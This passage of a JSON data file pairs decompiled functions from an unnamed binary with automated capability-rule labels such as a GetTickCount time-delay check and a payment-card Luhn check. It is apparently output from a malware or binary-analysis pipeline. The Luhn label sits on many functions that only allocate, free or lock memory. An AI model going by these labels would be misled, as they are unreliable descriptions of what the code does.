            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.000660a4(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uStack104;\n    ulong uStack96;\n    uint uStack88;\n    uint uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    uint uStack32;\n    \n    if ((*0x8e368 == 0) || (*0x8e370 == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uStack104 = *0x7db00;\n        uStack96 = *0x7db08;\n        uStack88 = *0x7db10;\n        uStack32 = 0;\n        uStack80 = arg1;\n        uStack72 = arg2;\n        uStack64 = arg3;\n        uStack56 = arg4;\n        iVar1 = (**(*0x8e368 + 0x38))(*0x8e370, &uStack104);\n        uVar2 = 0;\n        if (iVar1 == 0x2159020a) {\n            uVar2 = uStack32;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 274
    },
    "0006613c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint fcn.0006613c(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong uStack120;\n    ulong uStack112;\n    uint uStack104;\n    uint uStack96;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    uint uStack32;\n    \n    if ((*0x8e368 == 0) || (*0x8e370 == 0)) {\n        uVar2 = 0;\n    }\n    else {\n        uStack120 = *0x7db18;\n        uStack112 = *0x7db20;\n        uStack104 = *0x7db28;\n        uStack32 = 0;\n        uStack96 = arg1;\n        uStack72 = arg2;\n        uStack64 = arg3;\n        uStack56 = arg4;\n        iVar1 = (**(*0x8e368 + 0x38))(*0x8e370, &uStack120);\n        uVar2 = 0;\n        if (iVar1 == 0x2159020a) {\n            uVar2 = uStack32;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 274
    },
    "00016228": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00016228(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    ulong unaff_RBX;\n    bool bVar3;\n    ulong unaff_RDI;\n    uchar *arg4;\n    ulong in_stack_00000000;\n    ulong arg_c0h;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong noname_4;\n    ulong in_stack_ffffffffffffff80;\n    ulong in_stack_ffffffffffffff88;\n    ulong in_stack_ffffffffffffff90;\n    ulong in_stack_ffffffffffffff98;\n    ulong in_stack_ffffffffffffffa0;\n    ulong in_stack_ffffffffffffffa8;\n    ulong in_stack_ffffffffffffffb0;\n    ulong in_stack_ffffffffffffffb8;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    ulong in_stack_ffffffffffffffd8;\n    ulong in_stack_ffffffffffffffe0;\n    ulong in_stack_ffffffffffffffe8;\n    \n    bVar3 = false;\n    arg_c0h = 0;\n    uVar1 = fcn.0004cb4c();\n    *0x7dc50 = fcn.00030cc4(uVar1 * 0x170);\n    if (*0x7dc50 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        uVar1 = fcn.0004cb4c();\n        *0x7dc40 = fcn.00030cc4(uVar1 << 6);\n        if (*0x7dc40 == 0) {\n            uVar1 = 0xc000009a;\n        }\n        else {\n            uVar1 = fcn.0001a9b0(&stack0xffffffffffffff88, fcn.000578a0, 0);\n            if (uVar1 == 0) {\n                fcn.00032748(&stack0xffffffffffffff88, 0);\n                fcn.00032710(&stack0xffffffffffffff88);\n                (*_fcn.00011608)(&stack0xffffffffffffff88, 0, 0);\n                (**0x11610)(&stack0xffffffffffffffa8, 0x16130, &stack0xffffffffffffff88);\n                (**0x11618)(&stack0xffffffffffffffa8, 2);\n                (**0x11620)(&stack0xffffffffffffffa8, 0);\n                (**0x11628)(&stack0xffffffffffffffa8, 0, 0);\n                noname_4 = 0;\n                (*_fcn.00011630)(&stack0xffffffffffffff88, 0, 0, 0);\n                uVar1 = ~-(*0x7dc70 != 0) & 0xc002000b;\n                if ((uVar1 == 0) && (uVar1 = fcn.0004e130(*(*0x69080 + 0x10), 0x11678, 0x7dc68),  uVar1 == 0)) {\n                    iVar2 = fcn.0004e130(*(*0x69080 + 0x10), 0x11668, 0x7dc60);\n                    if (iVar2 == 0) {\n                        *0x7dc58 = **0x7dc60;\n                    }\n                    arg4 = &stack0x00000008;\n                    uVar1 = fcn.0001ac10(*0x11600, 0x100, 0, arg4);\n                    if (uVar1 == 0) {\n                        bVar3 = true;\n                        uVar1 = fcn.0004e130(*(*0x69080 + 0x10), 0x11650, &stack0x00000010);\n                        if ((uVar1 == 0) &&\n                           (uVar1 = fcn.000550f0(in_stack_00000010, 0x16942, 0x7dc78, arg4, noname_4, \n                                                 in_stack_ffffffffffffff80, in_stack_ffffffffffffff88, \n                                                 in_stack_ffffffffffffff90, in_stack_ffffffffffffff98, \n                                                 in_stack_ffffffffffffffa0, in_stack_ffffffffffffffa8, \n                                                 in_stack_ffffffffffffffb0, in_stack_ffffffffffffffb8, \n                                                 in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                                 in_stack_ffffffffffffffd0, in_stack_ffffffffffffffd8, \n                                                 in_stack_ffffffffffffffe0, in_stack_ffffffffffffffe8, unaff_RDI, \n                                                 unaff_RBX, in_stack_00000000, arg_c0h, in_stack_00000010, \n                                                 in_stack_00000018),  uVar1 == 0)) {\n                            fcn.00059140(*0x7dc78);\n                            *0x7dc80 = fcn.000547bc(*0x7dc78);\n                            uVar1 = fcn.000550f0(*0x7dc70, 0x169ea, 0x7dc88, arg4, noname_4, in_stack_ffffffffffffff80, \n                                                 in_stack_ffffffffffffff88, in_stack_ffffffffffffff90, \n                                                 in_stack_ffffffffffffff98, in_stack_ffffffffffffffa0, \n                                                 in_stack_ffffffffffffffa8, in_stack_ffffffffffffffb0, \n                                                 in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, \n                                                 in_stack_ffffffffffffffc8, in_stack_ffffffffffffffd0, \n                                                 in_stack_ffffffffffffffd8, in_stack_ffffffffffffffe0, \n                                                 in_stack_ffffffffffffffe8, unaff_RDI, unaff_RBX, in_stack_00000000, \n                                                 arg_c0h, in_stack_00000010, in_stack_00000018);\n                            if (uVar1 == 0) {\n                                fcn.00059140(*0x7dc88);\n                                *0x7dc90 = fcn.000547bc(*0x7dc88);\n                                *0x7dc98 = 1;\n                                return 0;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        fcn.00059140(*0x7dc78);\n        fcn.0005540c(0x7dc78);\n        if (bVar3) {\n            fcn.0001ac80(*0x11600, arg_c0h);\n        }\n        fcn.00030d24(*0x7dc40);\n        fcn.00030d24(*0x7dc50);\n    }\n    return uVar1;\n}\n",
        "token_count": 1468
    },
    "00016674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000325f3)\n// WARNING: Removing unreachable block (ram,0x000325ee)\n// WARNING: Removing unreachable block (ram,0x000325f9)\n// WARNING: Removing unreachable block (ram,0x000325dc)\n\nvoid fcn.00016674(void)\n\n{\n    fcn.00059140(*0x7dca0);\n    fcn.0005540c(0x7dca0);\n    fcn.000324dc(0x7dcb0, 1);\n    LOCK();\n    *0x7dcb8 = *0x7dcb8 + -1;\n    return;\n}\n",
        "token_count": 149
    },
    "000166b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000166b8(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    ulong *puVar3;\n    ulong uVar4;\n    \n    puVar3 = fcn.00030cc4(0x28);\n    if (puVar3 == NULL) {\n        uVar4 = 0x21590004;\n    }\n    else {\n        puVar3[1] = arg1;\n        *(puVar3 + 2) = arg2;\n        iVar1 = *(arg1 + 0x3c);\n        puVar3[3] = *(iVar1 + 0xa0 + arg1) + arg1;\n        uVar2 = *(iVar1 + 0xa4 + arg1);\n        *puVar3 = 0;\n        *(puVar3 + 4) = uVar2;\n        fcn.000324dc(0x7dcb0, 1);\n        *puVar3 = *0x7dca8;\n        *0x7dca8 = puVar3;\n        fcn.000325d8(0x7dcb0, 1);\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 274
    },
    "00016744": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00016744(int64_t arg1)\n\n{\n    ulong *puVar1;\n    ulong *arg1_00;\n    ulong *puVar2;\n    \n    fcn.000324dc(0x7dcb0, 1);\n    puVar1 = *0x7dca8;\n    puVar2 = NULL;\n    do {\n        arg1_00 = puVar1;\n        puVar1 = *0x7dca8;\n        if (arg1_00 == NULL) {\ncode_r0x00016790:\n            *0x7dca8 = puVar1;\n            fcn.000325d8(0x7dcb0, 1);\n            if ((arg1_00 != NULL) && (arg1_00 != 0x7ef38)) {\n                fcn.0001cab0(arg1_00, 0x7346744e);\n            }\n            return;\n        }\n        if (arg1_00[1] == arg1) {\n            puVar1 = *arg1_00;\n            if (puVar2 != NULL) {\n                *puVar2 = *arg1_00;\n                puVar1 = *0x7dca8;\n            }\n            goto code_r0x00016790;\n        }\n        puVar1 = *arg1_00;\n        puVar2 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 309
    },
    "00030d24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00030d24(int64_t arg1)\n\n{\n    if ((arg1 != 0) && (arg1 != 0x7ef38)) {\n        fcn.0001cab0(arg1, 0x7346744e);\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "000168bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000168bc(ulong arg1)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    uchar *arg4;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    \n    fcn.000324cc(0x7dcb0);\n    arg4 = &stack0x00000010;\n    *0x7dca8 = 0;\n    iVar1 = fcn.00051810(0, arg1, 0x11688, arg4);\n    if (iVar1 == 0) {\n        iVar1 = fcn.000550f0(in_stack_00000010, 0x167b0, 0x7dca0, arg4, unaff_RBX, in_stack_00000000, in_stack_00000008\n                             , in_stack_00000010, in_stack_00000018, in_stack_00000020, in_stack_00000028, \n                             in_stack_00000030, in_stack_00000038, in_stack_00000040, in_stack_00000048, \n                             in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                             in_stack_00000070, in_stack_00000078, in_stack_00000080, in_stack_00000088, \n                             in_stack_00000090, in_stack_00000098);\n        if (iVar1 == 0) {\n            fcn.00059140(*0x7dca0);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 517
    },
    "00016c04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00016c04(void)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = fcn.00016120();\n    iVar1 = iVar1 * 0x170 + *0x7dc50;\n    iVar2 = *(iVar1 + 0x40) + -5;\n    *(iVar1 + 0x40) = iVar2;\n    iVar1 = fcn.00016120();\n    iVar1 = iVar1 * 0x170 + *0x7dc50;\n    **(iVar1 + 0x48) = *(iVar1 + 0x40);\n    return iVar2;\n}\n",
        "token_count": 147
    },
    "00017004": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00017004(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint64_t noname_13;\n    uint64_t noname_15;\n    uint64_t in_RDX;\n    char cVar2;\n    ulong unaff_RDI;\n    ulong in_R9;\n    uint auStackX24 [2];\n    uchar auStackX32 [8];\n    uint *in_stack_ffffffffffffff48;\n    uint in_stack_ffffffffffffff50;\n    uint in_stack_ffffffffffffff54;\n    ulong in_stack_ffffffffffffff58;\n    ushort uVar3;\n    ushort uVar4;\n    uint in_stack_ffffffffffffff64;\n    ulong noname_8;\n    ulong in_stack_ffffffffffffff70;\n    ushort uVar5;\n    ushort uVar6;\n    uint in_stack_ffffffffffffff7c;\n    ulong noname_11;\n    ulong noname_12;\n    ulong noname_14;\n    uint uVar7;\n    uint in_stack_ffffffffffffffac;\n    ulong noname_17;\n    uchar *noname_18;\n    uint uVar8;\n    uint in_stack_ffffffffffffffc4;\n    ulong arg_b0h;\n    ulong arg_b8h;\n    ulong in_stack_ffffffffffffffd8;\n    ulong in_stack_ffffffffffffffe0;\n    \n    uVar5 = 0xa8;\n    uVar6 = 0xaa;\n    noname_11 = 0x11780;\n    uVar3 = 0x20;\n    uVar4 = 0x22;\n    noname_8 = 0x11758;\n    auStackX24[0] = 0xffffffff;\n    iVar1 = fcn.0001b1c4();\n    if (iVar1 == 0) {\n        noname_12 = *(*0x69080 + 4);\n        noname_13 = *(*0x69080 + 0xc);\n        noname_14 = *(*0x69080 + 0x10);\n        noname_15 = *(*0x69080 + 0x18);\n        iVar1 = fcn.00055c50(&stack0xffffffffffffff88);\n        if (((iVar1 == 0) && (iVar1 = fcn.000168bc(*(*0x69080 + 0x10)),  iVar1 == 0)) &&\n           (iVar1 = fcn.000166b8(*(*0x69080 + 4), *(*0x69080 + 0xc)),  iVar1 == 0)) {\n            fcn.0001ccdc();\n            cVar2 = in_RDX & 0xff;\n            if (cVar2 != '\\0') {\n                fcn.00017880(arg1);\n            }\n            iVar1 = fcn.00016228();\n            if (iVar1 == 0) {\n                noname_18 = &stack0xffffffffffffff78;\n                uVar7 = 0x30;\n                noname_17 = 0;\n                uVar8 = 0x40;\n                arg_b0h = 0;\n                arg_b8h = 0;\n                iVar1 = fcn.000666fe(&stack0xffffffffffffff58, 2, &stack0xffffffffffffffa8);\n                if (iVar1 == 0) {\n                    in_R9 = 4;\n                    in_stack_ffffffffffffff48 = auStackX24;\n                    in_stack_ffffffffffffff50 = 4;\n                    fcn.000666f8(in_stack_ffffffffffffff58, &stack0xffffffffffffff60, 0);\n                    fcn.000666f2(in_stack_ffffffffffffff58);\n                }\n                iVar1 = fcn.0001773c();\n                if (((iVar1 == 0) &&\n                    (iVar1 = fcn.0004e130(*(*0x69080 + 0x10), 0x11748, &stack0xffffffffffffff70),  iVar1 == 0)) &&\n                   (iVar1 = fcn.000550f0(in_stack_ffffffffffffff70, 0x16e80, 0x7dcd0, in_R9, in_stack_ffffffffffffff48, \n                                         CONCAT44(in_stack_ffffffffffffff54, in_stack_ffffffffffffff50), \n                                         in_stack_ffffffffffffff58, \n                                         CONCAT44(in_stack_ffffffffffffff64, CONCAT22(uVar4, uVar3)), noname_8, \n                                         in_stack_ffffffffffffff70, \n                                         CONCAT44(in_stack_ffffffffffffff7c, CONCAT22(uVar6, uVar5)), noname_11, \n                                         noname_12, noname_13, noname_14, noname_15, \n                                         CONCAT44(in_stack_ffffffffffffffac, uVar7), noname_17, noname_18, \n                                         CONCAT44(in_stack_ffffffffffffffc4, uVar8), arg_b0h, arg_b8h, \n                                         in_stack_ffffffffffffffd8, in_stack_ffffffffffffffe0, unaff_RDI),  iVar1 == 0))\n                {\n                    fcn.00059140(*0x7dcd0);\n                    if (((cVar2 == '\\0') && (iVar1 = fcn.00030a40(0x11738, auStackX32),  iVar1 != 0)) &&\n                       ((iVar1 = fcn.00030a40(0x11728, auStackX32),  iVar1 != 0 &&\n                        ((iVar1 = fcn.00030a40(0x11718, auStackX32),  iVar1 != 0 &&\n                         (iVar1 = fcn.00030a40(0x11708, auStackX32),  iVar1 != 0)))))) {\n                        return 0;\n                    }\n                    iVar1 = fcn.0001a9b0(&stack0xffffffffffffffd8, 0x1c940, in_RDX & 0xff);\n                    if (iVar1 != 0) {\n                        return 0;\n                    }\n                    fcn.00032710(&stack0xffffffffffffffd8);\n                    return 0;\n                }\n            }\n        }\n    }\n    fcn.00016e04(1);\n    return iVar1;\n}\n",
        "token_count": 1344
    },
    "00017298": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.00017298(void)\n\n{\n    int32_t *piVar1;\n    ulong *noname_0;\n    bool bVar2;\n    int64_t arg1;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    ulong arg1_00;\n    ulong *arg1_01;\n    int64_t *piVar6;\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    fcn.00059140(*0x7dcf8);\n    arg1 = *0x7dcf8;\n    arg1_01 = 0x7dcf8;\n    bVar2 = false;\n    uStackX16 = 0;\n    uStackX8 = 0;\n    uStackX32 = 0;\n    uStackX24 = 0;\n    if (*0x8d368 == 0) {\n        return 0x21590001;\n    }\n    if ((*0x7dcf8 == 0) ||\n       ((((*(*0x7dcf8 + 0xb0) != 0 && (*(*0x7dcf8 + 0xb0) != 1)) || (*(*0x7dcf8 + 0x10) == 0)) ||\n        ((*(*0x7dcf8 + 0x28) == 0 || (*(*0x7dcf8 + 0x20) == 0)))))) {\n        return 0x21590065;\n    }\n    if (*(*0x7dcf8 + 0xb4) == 2) {\n        arg1_01 = &uStackX32;\n        uVar5 = fcn.00054190(arg1_01, &uStackX24);\n    }\n    else {\n        uVar5 = 0;\n    }\n    if (uVar5 != 0) {\n        return uVar5;\n    }\n    if (*(arg1 + 0xc0) == 0) {\n        noname_0 = *(arg1 + 0x10);\n        *(arg1 + 200) = 4;\n        *(arg1 + 0xc0) = noname_0;\n        uVar4 = *(arg1 + 200);\n        arg1_01 = noname_0;\n        uVar3 = fcn.0001ac10(noname_0, uVar4, 2, arg1 + 0xd0);\n        *(arg1 + 0xc0) = noname_0;\n        *(arg1 + 200) = uVar4;\n        uVar5 = uVar3;\n        if (uVar3 != 0) goto code_r0x000555f1;\n    }\n    uVar4 = fcn.0001aac0(CONCAT71(arg1_01 >> 8, 2), &uStackX16, &uStackX8);\n    uVar5 = uVar4;\n    if (uVar4 != 0) goto code_r0x000555f1;\n    arg1_00 = fcn.0001aa84();\n    uVar4 = 0;\n    if (*0x8d360 == 0) {\ncode_r0x000555b1:\n        uVar5 = 0x21590005;\n    }\n    else {\n        piVar6 = *0x8d358 + 8;\n        do {\n            if (*piVar6 == arg1) {\n                uVar5 = uVar4;\n                piVar1 = *(*0x8d358 + 8 + uVar5 * 0x10) + 0xd8;\n                *piVar1 = *piVar1 + -1;\n                if (*(*(*0x8d358 + 8 + uVar5 * 0x10) + 0xd8) != 0) {\n                    uVar5 = 0;\n                    goto code_r0x000555b6;\n                }\n                *(*0x8d358 + 8 + uVar5 * 0x10) = 0;\n                *(*0x8d358 + uVar5 * 0x10) = 0;\n                uVar4 = 0xffffffff;\n                break;\n            }\n            uVar4 = uVar4 + 1;\n            piVar6 = piVar6 + 2;\n        } while (uVar4 < *0x8d360);\n        if (uVar4 != 0xffffffff) goto code_r0x000555b1;\n        fcn.00054624(arg1);\n        uVar5 = 0;\n        bVar2 = true;\n    }\ncode_r0x000555b6:\n    fcn.0001aa94(arg1_00);\n    fcn.0001abd4(uStackX16, uStackX8);\n    if ((uVar5 == 0) && (bVar2)) {\n        fcn.0001ac80(*(arg1 + 0xc0), *(arg1 + 0xd0));\n        fcn.000545c4(0x7dcf8);\n    }\ncode_r0x000555f1:\n    fcn.00054a78(uStackX32, uStackX24);\n    return uVar5;\n}\n",
        "token_count": 1159
    },
    "00017460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00017460(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    ulong auStackX24 [2];\n    uchar auStack40 [24];\n    \n    fcn.00066704(auStack40, arg1);\n    iVar1 = (*_fcn.000115a8)(auStack40, 0, auStackX24, arg2);\n    if (iVar1 == 0) {\n        (**0x115b0)(*arg2);\n        (*_fcn.000115b8)(auStackX24[0]);\n    }\n    return iVar1;\n}\n",
        "token_count": 135
    },
    "0001773c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0001773c(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    ulong in_stack_00000098;\n    \n    fcn.000324cc(0x7dcd8);\n    iVar1 = fcn.0004e130(*(*0x69080 + 0x10), 0x11830, &stack0x00000008);\n    if (iVar1 == 0) {\n        iVar1 = fcn.000550f0(in_stack_00000008, 0x175c8, 0x7dcf8, in_R9, unaff_RBX, in_stack_00000000, in_stack_00000008\n                             , in_stack_00000010, in_stack_00000018, in_stack_00000020, in_stack_00000028, \n                             in_stack_00000030, in_stack_00000038, in_stack_00000040, in_stack_00000048, \n                             in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                             in_stack_00000070, in_stack_00000078, in_stack_00000080, in_stack_00000088, \n                             in_stack_00000090, in_stack_00000098);\n        if (iVar1 == 0) {\n            fcn.00059140(*0x7dcf8);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 504
    },
    "000177a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000177a4(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    fcn.000172b8(arg1, arg2, arg3);\n    return;\n}\n",
        "token_count": 44
    },
    "000177bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000177bc(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uchar *puVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    puVar1 = *(arg2 + 0xb8);\n    if (arg3 != 0) {\n        puVar3 = fcn.00030cc4(0x58);\n        if (puVar3 == NULL) {\n            *(arg2 + 0x30) = 0xc000009a;\n            (**0x11590)(arg2, 0);\n            return 0xc000009a;\n        }\n        *puVar3 = *(puVar1 + 0x38);\n        uVar2 = *(puVar1 + 0x40);\n        puVar3[2] = arg3;\n        puVar3[3] = arg4;\n        puVar3[1] = uVar2;\n        uVar2 = *(puVar1 + 0x30);\n        puVar3[5] = arg1;\n        puVar3[4] = uVar2;\n        *(puVar3 + 6) = puVar1[3];\n        *(puVar3 + 0x32) = *puVar1;\n        *(puVar3 + 0x33) = puVar1[1];\n        *(puVar3 + 0x31) = puVar1[2];\n        fcn.0006670a(puVar3 + 0x34, puVar1 + 8, 0x20);\n        *(puVar1 + 0x38) = 0x174b0;\n        *(puVar1 + 0x40) = puVar3;\n        puVar1[3] = 0xe0;\n    }\n    return 0;\n}\n",
        "token_count": 402
    },
    "00019460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00019460(void)\n\n{\n    ulong *puVar1;\n    ulong *arg1;\n    \n    *0x7e240 = 1;\n    fcn.0002fcb8(0x7e208);\n    fcn.00032748(0x7e210, 0);\n    fcn.00032710(0x7e210);\n    fcn.000324dc(0x7e1e8, 1);\n    arg1 = *0x7e200;\n    while (arg1 != NULL) {\n        puVar1 = *arg1;\n        fcn.00030d24(arg1);\n        arg1 = puVar1;\n    }\n    *0x7e200 = NULL;\n    fcn.000325d8(0x7e1e8, 1);\n    return 0;\n}\n",
        "token_count": 188
    },
    "000193f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000193f0(void)\n\n{\n    int32_t iVar1;\n    \n    fcn.000324cc(0x7e1e8);\n    fcn.000324cc(0x7e220);\n    *0x7e238 = 0;\n    iVar1 = fcn.0002fc18(0x7e208);\n    if (iVar1 != 0) {\n        iVar1 = fcn.0001a9b0(0x7e210, 0x191f8, 0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        fcn.0002fc94(0x7e208);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 160
    },
    "000198d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000198d0(ulong *arg1)\n\n{\n    if (arg1 != NULL) {\n        fcn.00030d24(*arg1);\n        fcn.00030d24(arg1);\n    }\n    return;\n}\n",
        "token_count": 54
    },
    "0001a238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0001a238(void)\n\n{\n    uint auStackX8 [8];\n    \n    auStackX8[0] = 0;\n    fcn.000667a6(0xffffffffffffffff, 6, auStackX8);\n    return;\n}\n",
        "token_count": 59
    },
    "0001a4e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0001a4e0(uint64_t arg1, uchar *arg2)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    uint64_t uStack88;\n    ulong uStack80;\n    uint auStack72 [2];\n    ulong uStack64;\n    ulong uStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    auStack72[0] = 0x30;\n    uStack88 = arg1 & 0xffffffff;\n    uStack64 = 0;\n    uStack48 = 0;\n    uStack80 = 0;\n    uStack56 = 0;\n    uStack40 = 0;\n    uStack32 = 0;\n    uVar2 = fcn.000667b2(&uStackX24, 0x400, auStack72, &uStack88);\n    if (uVar2 == 0) {\n        uVar1 = fcn.000667a0(uStackX24, 0x1a, auStackX32, 8, 0);\n        uVar2 = uVar1;\n        if (uVar1 == 0) {\n            *arg2 = auStackX32[0];\n        }\n        fcn.000666f2(uStackX24);\n    }\n    return uVar2;\n}\n",
        "token_count": 316
    },
    "0001a9b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
